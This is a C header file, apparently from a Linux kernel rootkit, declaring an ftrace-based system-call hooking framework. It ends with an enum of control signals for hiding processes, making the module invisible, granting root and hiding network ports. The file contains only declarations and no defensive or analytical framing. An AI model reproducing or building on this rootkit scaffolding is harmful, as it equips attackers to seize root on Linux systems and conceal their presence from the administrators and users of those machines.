#ifndef HOOKS_H
#define HOOKS_H

#include <linux/init.h>
// headers
#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define MAX_TCP_PORTS 65535

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _hook, _orig) \
  { .name = (_name), .function = (_hook), .original = (_orig), }

#define HOOK_N(_name, _hook, _orig) HOOK(SYSCALL_NAME(_name), _hook, _orig)

/*
 * There are two ways of preventing vicious recursive loops when hooking:
 * - detect recusion using function return address (USE_FENTRY_OFFSET = 0)
 * - avoid recusion by jumping over the ftrace call (USE_FENTRY_OFFSET = 1)
 * https://github.com/ilammy/ftrace-hook/blob/ff7bad4cd3de3d5ed8fe2baf8a1676d1cec7b5d8/ftrace_hook.c#L56
 */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
  const char *name;
  void *function;
  void *original;

  unsigned long address;
  struct ftrace_ops ops;
};

int fh_resolve_hook_address(struct ftrace_hook *hook);

void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                        struct ftrace_ops *ops, struct ftrace_regs *fregs);

int fh_install_hook(struct ftrace_hook *hook);

void fh_remove_hook(struct ftrace_hook *hook);

int fh_install_hooks(struct ftrace_hook *hooks, size_t count);

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

enum { SIGHIDE = 31, SIGMODINVIS = 63, SIGROOT = 64, SIGPORT = 62 };

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
  (defined(__enabled_##option) || defined(__enabled_##option##_MODULE))
#endif

#endif
